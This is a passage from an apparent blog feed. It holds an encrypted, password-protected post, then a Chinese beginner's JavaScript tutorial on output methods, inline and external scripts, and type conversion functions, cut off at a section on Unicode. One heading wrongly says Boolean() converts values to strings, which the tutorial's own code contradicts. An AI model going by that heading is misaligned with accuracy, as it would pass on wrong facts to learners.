29c34544d66cebd015499240774d3a8e290ec5db4ade4ed275f15d82b5c01b70bf649156c37d26528ecbca9867bfbd406da1a92964edc56ce02c4de0cbbf6ae4f576ee9a4418ce0e28e9ac998af3b0c3504e66eb71b219012a34d6eae1679174e3b870ad02d483d0ba7a00e56b4b41230f07d0dc0192114578a98112c304a298d9940eb7aaa1d9a06c97e90988e8801d571c357f306b7041dd0282c6f66934818b82653766c2ac75cb031e037f79834098d5d49e40f7eae8f50b7b4048ec9ba9c877f879af4f60a949795489ef762b66098242b1bf104351f0d06b521f28520873fd39461be90d84af2660771d9dceb76be52b8ef314404b03544f2bf0ba7d3c86a22a0b882090fedc82737559c2cf21ba29112eb94a1c355f817671153801f434feb9298b061263d3486375d1e6314b82684c5e18ac8dcc0cc56ab132e99fa7b511b6149d64662616d5ff5a5b331b9d0ec562415650be4c999219aa4c6f2f87458c8efcdbd51895de02c053d0dff15af1186a8599063aa1731d7b1104331f3989fb7af2811b1546f8536075356e65fa2ebe14db8af1a1fe55897f0940f1d44fae5dd57a755e64cd91fe796c62e003d83cd5b5219cd51b4b6b2decba5d5c9f82204b18c23c1236d31cc4ae39c361b78dd8546557ce0390a7b2276eb16074aae1b40c7ee5f53df716d5942da477dc4c2becb339374660ce1afd379444121826da9340f94226db4d822af5f470acab4296ee13e12d2c887981925f0b3f7765be7adb067b815e0d6ef600de438a0fe08c19363f2f8bd64372623a48fab00ca6791f6a16b300b479572fe4366aa2f3c9885a053a012b2174c2d3430777c34c0f8f7e8ab48956b1b5a183d481a0c3dec6d778c285420a05624</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript入门</title>
    <url>/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>[toc]</p>
<h3 id="alert—控制浏览器弹出警告框"><a href="#alert—控制浏览器弹出警告框" class="headerlink" title="alert—控制浏览器弹出警告框"></a>alert—控制浏览器弹出警告框</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="title function_">alert</span>(<span class="string">&quot;你好世界&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127144935599.png" alt="image-20230127144935599"></p>
<h3 id="document-write—向body中输出一个内容"><a href="#document-write—向body中输出一个内容" class="headerlink" title="document.write—向body中输出一个内容"></a>document.write—向body中输出一个内容</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;你好世界&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127145807827.png" alt="image-20230127145807827"></p>
<h3 id="console-log—向控制台输出内容"><a href="#console-log—向控制台输出内容" class="headerlink" title="console.log—向控制台输出内容"></a>console.log—向控制台输出内容</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好世界&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127154535686.png" alt="image-20230127154535686"></p>
<h3 id="button—按钮"><a href="#button—按钮" class="headerlink" title="button—按钮"></a>button—按钮</h3><p><strong>可以将js编写到button标签的onlick属性中，当我们点击按钮时候，js代码才会执行</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;你干嘛~哈哈~诶哟&#x27;)&quot;</span>&gt;</span>点我一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127175516056.png" alt="image-20230127175516056"></p>
<h3 id="href—可以把js代码写入href属性中"><a href="#href—可以把js代码写入href属性中" class="headerlink" title="href—可以把js代码写入href属性中"></a>href—可以把js代码写入href属性中</h3><p><strong>这样点击超链接，就会执行js代码</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;你干嘛~哈哈~诶哟&#x27;);&quot;</span>&gt;</span>点我一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127180038954.png" alt="image-20230127180038954"></p>
<h3 id="script—标签引入外部js文件"><a href="#script—标签引入外部js文件" class="headerlink" title="script—标签引入外部js文件"></a>script—标签引入外部js文件</h3><p><strong>写到外部文件中可以在不同的页面中同时引用，也可以利用到浏览器的缓存机制，推荐使用</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127181115462.png" alt="image-20230127181115462"></p>
<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127181039767.png" alt="image-20230127181039767"></p>
<p><strong>script标签一旦用于引入外部文件，就不能编写内部代码了，即使有也会被浏览器忽略，如果需要则可以再创建一个新的script标签用于编写内部代码</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;我是内部js标签&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127181828388.png" alt="image-20230127181828388"></p>
<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230127181549688.png" alt="image-20230127181549688"></p>
<h3 id="toString—调用数据类型的方法"><a href="#toString—调用数据类型的方法" class="headerlink" title="toString—调用数据类型的方法"></a>toString—调用数据类型的方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="number">123</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> b = a.<span class="title function_">toString</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129010048594.png" alt="image-20230129010048594"></p>
<h3 id="string-—直接调用函数"><a href="#string-—直接调用函数" class="headerlink" title="string()—直接调用函数"></a>string()—直接调用函数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="number">123</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> b = <span class="title class_">String</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129010239358.png" alt="image-20230129010239358"></p>
<h3 id="Number-—直接调用函数"><a href="#Number-—直接调用函数" class="headerlink" title="Number()—直接调用函数"></a>Number()—直接调用函数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="string">&quot;123&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> b = <span class="title class_">Number</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129010534088.png" alt="image-20230129010534088"></p>
<h3 id="parseInt-—该函数将字符串的有效的整数提取出来"><a href="#parseInt-—该函数将字符串的有效的整数提取出来" class="headerlink" title="parseInt()—该函数将字符串的有效的整数提取出来"></a>parseInt()—该函数将字符串的有效的整数提取出来</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="string">&quot;123.ab&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> b = <span class="built_in">parseInt</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129011133454.png" alt="image-20230129011133454"></p>
<h3 id="parseFloat-—取有效的小数"><a href="#parseFloat-—取有效的小数" class="headerlink" title="parseFloat()—取有效的小数"></a>parseFloat()—取有效的小数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="string">&quot;123.456.789ab&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> b = <span class="built_in">parseFloat</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129011328896.png" alt="image-20230129011328896"></p>
<h3 id="Boolean-—该函数可以转成字符串"><a href="#Boolean-—该函数可以转成字符串" class="headerlink" title="Boolean()—该函数可以转成字符串"></a>Boolean()—该函数可以转成字符串</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="number">123</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> b = <span class="title class_">Boolean</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> b);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129121729902.png" alt="image-20230129121729902"></p>
<h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p><strong>js里面可以直接使用Unicode编码，在html里面需要换算成为10进制而且用放在&amp;#后面</strong></p>
